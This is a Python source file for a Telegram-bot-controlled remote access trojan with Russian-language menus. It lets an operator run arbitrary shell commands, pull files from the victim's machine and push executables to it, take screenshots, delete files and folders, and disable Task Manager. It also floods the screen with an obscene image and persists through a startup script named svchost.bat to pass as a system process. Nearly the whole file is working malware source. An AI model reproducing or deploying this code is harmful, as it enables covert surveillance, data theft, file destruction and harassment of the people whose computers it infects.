adminId =  #int
token = ""
import requests
while True:
	try:
		requests.get("http://google.com")
		break
	except: pass


import telebot
from telebot.types import ReplyKeyboardMarkup as markup
from telebot.types import InlineKeyboardButton as button
from telebot.types import InlineKeyboardMarkup as inline

from winreg import *
from os import path
import os
import webbrowser
from random import choice, randint
from threading import Thread
import subprocess
import pyautogui
from pygame import mixer
from gtts import gTTS
import time
import getpass
import json
import sys
import psutil
from tkinter import messagebox
USER_NAME = getpass.getuser()


pyautogui.FAILSAFE = False
commands_list="Все команды:\n/delete\n/check\n/open\n/search\n/console\n/get\n/post\n/run\n/stop\n/voice\n/create\n/read\n/write\n/mess\n/fold"
PCK = False
mouse = False
lock = False
save = "None"
#========================markups=====================================

global_menu = button("На главную🚩")

#-------------------------старт меню---------------------------------
func = button("Функции💽")
commands = button("Слэш команды⚡")
dangerous_commands = button("Опасная зона🛑")
help_b = button("Помощь❓")
start_menu = markup(resize_keyboard = True, row_width=2).add(func, commands, dangerous_commands, help_b)

#-----------------функции------------------------------------------
screen_b = button("Скриншот💻")
restart = button("Перезагрузить ПК💻")
start_mouse = button("Запустить непослушную мышку💻")
stop_mouse = button("Остановить непослушную мышку💻")
stop = button("Отключить ПК💻")
kill = button("Запустить PCK💻")
kill_stop = button("Остановить PCK💻")
random_del = button("Удалить рандомный файл с диска D💻")
proc_b = button("Процессы💻")
func_menu = markup(resize_keyboard = True, row_width=2).add(screen_b, start_mouse, stop_mouse, restart, stop, kill, kill_stop, random_del, proc_b, global_menu)


#---------------------Dangerous zone-----------------------------------
kill_Taskmgr_b = button("Заблокировать диспетчер задач💻")
off = button("Потушить экран⚠")
on = button("Включить экран⚠")
lock = button("Заблокировать мышку💻")
unlock = button("Разблокировать мышку💻")
Dangerous_zone = markup(resize_keyboard = True, row_width=2).add(kill_Taskmgr_b,off,on,lock,unlock,global_menu)

def gen_name(num: int = 8):
	g = ""
	for x in range(num):
		g = g + choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
	return g

def img_spam():
	global PCK
	while PCK:
		p = requests.get('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg')
		name = gen_name()
		out = open(f"D:/{name}.jpg", "wb")
		out.write(p.content)
		out.close()
		os.startfile(rf"D:/{name}.jpg")

def browser_open():
	global PCK
	while PCK:
		webbrowser.open('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg', new=2)

def PCK_start():
	for i in range(80):
		Thread(target=img_spam).start()
		Thread(target=browser_open).start()

def delete_rand():
	try:
		objects = os.listdir('D:/')
		file = choice(objects)
		os.remove(f'D:/{file}')
		return f'Файл {file} удалён'
	except Exception as error: return f"Произошла ошибка:\n{error}"

def delete(path):
	try:
		os.remove(path)
		return f'Файл по пути "{path}" удалён'
	except Exception as error: return f"Произошла ошибка:\n{error}"

def check(path, userId):
	try:
		file_list = os.listdir(path)
		files = '\n'.join(file_list)
		if len(files) > 4096:
			for x in range(0, len(files), 4096):
				client.send_message(userId, files[x:x+4096])
		else:
			client.send_message(userId,  f'Файлы в указанной директории:\n{files}')
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def open_url(url):
	try:webbrowser.open(url, new=2); return f'Страница по ссылке открыта✔'
	except Exception as error: return f"Произошла ошибка:\n{error}"


def get_process(userId):
	try:
		processess_list = list()
		for proc in  psutil.process_iter():
			processess_list.append(proc.name())
		processess = '\n'.join(processess_list)
		if len(str(processess)) > 4096:
			for x in range(0, len(str(processess)), 4096):
				client.send_message(userId, str(processess)[x:x+4096])
		else:
			client.send_message(userId,  f'Все запущенные процессы💻:\n{str(processess)}')
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def search_file(file, userId):
	try:
		spisok = list()
		for adress, dirs, files in os.walk('D:\\'):
			if file in adress:
				spisok.append(adress)
		for adress, dirs, files in os.walk('C:\\'):
			if file in adress:
				spisok.append(adress)
		if spisok == []:client.send_message(userId,  f'Ни одного файла с именем {file} не найдено')
		else:
			info = '\n'.join(spisok)
			if len(info) > 4096:
				for x in range(0, len(info), 4096):
					bot.send_message(userId, info[x:x+4096])
			else:
				client.send_message(userId,  f'Все найденные файлы с именем "{file}":\n{info}')
	except Exception as error: client.send_message(userId,  f"Произошла ошибка:\n{error}")


def send_mess(userId, message):
	try:messagebox.showinfo('Message for You 💞', message);client.send_message(userId, f"Сообщение показано на экран✔")
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")


def get(path, userId):
	try:
		file = open(path, 'rb')
		client.send_document(userId, file)
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def post(message, path, userId):
	try:
		file_name = message.document.file_name
		file_id = message.document.file_name
		file_id_info = client.get_file(message.document.file_id)
		downloaded_file = client.download_file(file_id_info.file_path)
		src = file_name
		with open(f'{path}/{src}', 'wb') as new_file:
			new_file.write(downloaded_file)
		client.send_message(message.chat.id, f"Файл успешно сохранён по пути \"{path}\"")
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")


def run_file(file):
	try:subprocess.call(file); return 'Запускаю файл'
	except Exception as error: return f"Произошла ошибка:\n{error}"

def screenshot(userId):
	try:
		screen = pyautogui.screenshot('screenshot.png')
		client.send_photo(userId, screen)
		os.remove('screenshot.png')
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def stop_exe(app, userId):
	if app !="":
		try:os.system(f"TASKKILL /F /IM {app}");client.send_message(userId, f"если {app} был запущен, теперь закрыт✔")
		except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")
	else:client.send_message(userId, f"Вы не указали приложение")

def voice(userId, text):
	try:
		output = gTTS(text=text, lang='ru', slow=False)
		output.save("output.mp3")
		mixer.init()
		mixer.music.load('output.mp3')
		mixer.music.play(0)
		time.sleep(len(text)/5)
		mixer.quit()
		client.send_message(userId, f"Текст переведён в аудио сообщение и был проигран✔")
		os.remove('output.mp3')
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def mouse_start():
	global mouse
	while mouse:
		pyautogui.moveTo(randint(1, 1900), randint(1, 1900), duration=0.25)


def add_to_startup():
	while True:
		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
		with open(bat_path + '\\' + "svchost.bat", "w+") as bat_file:
			bat_file.write(fr'start {sys.argv[0]}')
		time.sleep(2)

def kill_Taskmgr(userId):
	try:
		path1 = "C:\Windows\System32\Taskmgr.exe"
		path2 = "C:\Windows\System32\Taskmgr1.exe"

		os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
		os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
		os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
		os.system("taskkill /im taskmgr.exe")
		try:os.rename(path1, path2)
		except:pass
		client.send_message(userId, f"Готово✔")
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def lock_mouse():
	global lock
	while lock:
		pyautogui.moveTo(0, 0)

def delete_fold(userId, path):
	try:Sutil.rmtree(path);client.send_message(userId, f"Все возможные файлы удалены✔")
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")
def write_file(path, text, userId):
	try:
		file = open(path, 'w')
		file.write(text)
		file.close()
		client.send_message(userId, 'Готово✔')
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def read_file(path, userId):
	try:
		text = open(path, encoding='utf-8').read()
		if len(text) > 4096:
			for x in range(0, len(text), 4096):
				bot.send_message(userId, text[x:x+4096])
		else:
			client.send_message(userId,  text)
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")

def command_parser(ct: str, userId, save):
	global PCK
	global mouse
	global lock
	content = ct.split(" ")
	try:
		if ct.lower() == "функции💽": client.send_message(userId, 'Перехожу...', reply_markup = func_menu)
		elif ct.lower() == "слэш команды⚡": client.send_message(userId, commands_list)
		elif ct.lower() == "на главную🚩": client.send_message(userId, 'Перехожу...', reply_markup = start_menu)
		elif ct.lower() == "опасная зона🛑": client.send_message(userId, 'Перехожу...', reply_markup = Dangerous_zone)
		elif ct.lower() == 'помощь❓': client.send_message(userId, 'Тут расписана каждая команда:', reply_markup = inline().add(button("Help❓", url='https://teletype.in/@xsarz-xpu/vzKfJ1fontd')))

		elif ct.lower() == 'скриншот💻':screenshot(userId=userId)
		elif ct.lower() == 'заблокировать диспетчер задач💻': kill_Taskmgr(userId=userId)
		elif ct.lower() == "запустить непослушную мышку💻":
			if mouse == False:
				mouse=True
				for i in range(10):
					Thread(target=mouse_start).start()
				client.send_message(userId, 'Готово✔')
			else:client.send_message(userId, 'Эта функция уже запущена')
		elif ct.lower() == "остановить непослушную мышку💻":
			if mouse == True:client.send_message(userId, 'Остановка...');mouse=False
			else:client.send_message(userId, 'Эта функция не запущена')
		elif ct.lower() == "отключить пк💻": client.send_message(userId, 'Отключаю пк...');os.system("shutdown -s -t 1")
		elif ct.lower() == "перезагрузить пк💻": client.send_message(userId, 'Перезагружаю пк...');os.system("shutdown -r -t 1")
		elif ct.lower() == "запустить pck💻": client.send_message(userId, 'Запускаю PCK⚡');PCK=True;	Thread(target=PCK_start).start()
		elif ct.lower() == "остановить pck💻":
			if PCK == True: client.send_message(userId, 'Останавливаю потоки PCK...');PCK=False
			else: client.send_message(userId, 'PCK не запущен🛑')
		elif ct.lower() == "удалить рандомный файл с диска d💻":
			del_info = delete_rand()
			client.send_message(userId, del_info)
		elif ct.lower() == 'потушить экран⚠':
			try:os.system(f"TASKKILL /F /IM explorer.exe");client.send_message(userId, 'Готово✔')
			except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")
		elif ct.lower() == 'включить экран⚠':
			try:subprocess.call('C:\Windows\explorer.exe');client.send_message(userId, 'Готово✔')
			except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")
		elif ct.lower() == 'заблокировать мышку💻':
			client.send_message(userId, 'Блокирую⚡');lock=True
			for i in range(10):
				Thread(target=lock_mouse).start()
		elif ct.lower() == 'разблокировать мышку💻':
			if lock == True: client.send_message(userId, 'Готово✔');lock=False
			else: client.send_message(userId, 'Мышка не заблокирована🛑')
		elif ct.lower() == 'процессы💻':get_process(userId=userId)

		else:
			if content[0][0] == '/':
				if content[0][1:] == 'delete':client.send_message(userId, delete(path=ct.replace(content[0],"")[1:]))
				elif content[0][1:] == 'check':check(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'open':client.send_message(userId, open(url=ct.replace(content[0],"")[1:]))
				elif content[0][1:] == 'search':client.send_message(userId, 'Начат поиск файлов с подходящим именем.\nКак только процесс будет закончен, я уведомлю вас✔');Thread(target=search_file, args=(ct.replace(content[0],"")[1:], userId)).start()
				elif content[0][1:] == 'console':os.system(ct.replace(content[0],"")[1:])
				elif content[0][1:] == 'get':get(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'post' and save[0][1:]!='post':client.send_message(userId, 'Ожидаю файл🧨')
				elif content[0][1:] == 'run':client.send_message(userId, run_file(file=ct.replace(content[0],"")[1:]));client.send_message(userId, 'Команда отправлена✔')
				elif content[0][1:] == 'stop':stop_exe(app=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'voice':voice(userId=userId, text=ct.replace(content[0],""))
				elif content[0][1:] == 'fold':delete_fold(userId=userId, path=ct.replace(content[0],"")[1:])
				elif content[0][1:] == 'create':
					path = ct.replace(content[0],"")[1:]
					try:file = open(path, 'w');file.close();client.send_message(userId, f'Файл создан✔\nПуть: {path}')
					except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")
				elif content[0][1:] == 'write':write_file(path=content[1], text=ct.replace(content[0],"").replace(content[1],"")[1:], userId=userId)
				elif content[0][1:] == 'read':read_file(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'mess':send_mess(userId=userId, message=ct.replace(content[0],""))
			else:client.send_message(userId, "Команда не найдена☹")
	except IndexError:client.send_message(userId, 'Вы не указали аргументы')
	except Exception as error:client.send_message(userId, f"Произошла ошибка:\n{error}")


#=======================================================
client = telebot.TeleBot(token)
client.send_message(adminId, 'Пк в сети⚡')
@client.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == adminId: client.send_message(message.from_user.id, 'Привет {0.first_name}, выбери команду'.format(message.from_user), reply_markup = start_menu)
	else:  client.send_message(message.from_user.id, 'Вы не админ'.format(message.from_user))

@client.message_handler(content_types=['text'])
def on_msg(message):
	global save
	text = message.text
	user_id = message.from_user.id
	if user_id != adminId: client.send_message(message.from_user.id, 'Вы не админ')
	else:save = text;command_parser(ct=text, userId=user_id, save=save.lower().split(" "))

@client.message_handler(content_types=['document'])
def on_file(message):
	document_id = message.document.file_id
	file_info = client.get_file(document_id)
	file = f'http://api.telegram.org/file/bot{token}/{file_info.file_path}'
	global save
	content = save.lower().split(" ")
	if content[0][0] == '/':
		if content[0][1:] == 'post':
			try:
				path=save.replace(content[0],"")[1:]
				p = requests.get(file)
				out = open(path, "wb")
				out.write(p.content)
				out.close()
				client.send_message(message.from_user.id, f'Файл сохранён\nПуть к файлу:\n{path}')
			except Exception as error:client.send_message(message.from_user.id, f"Произошла ошибка:\n{error}")


if __name__ == '__main__':
	Thread(target=add_to_startup).start()
	client.polling(none_stop=True)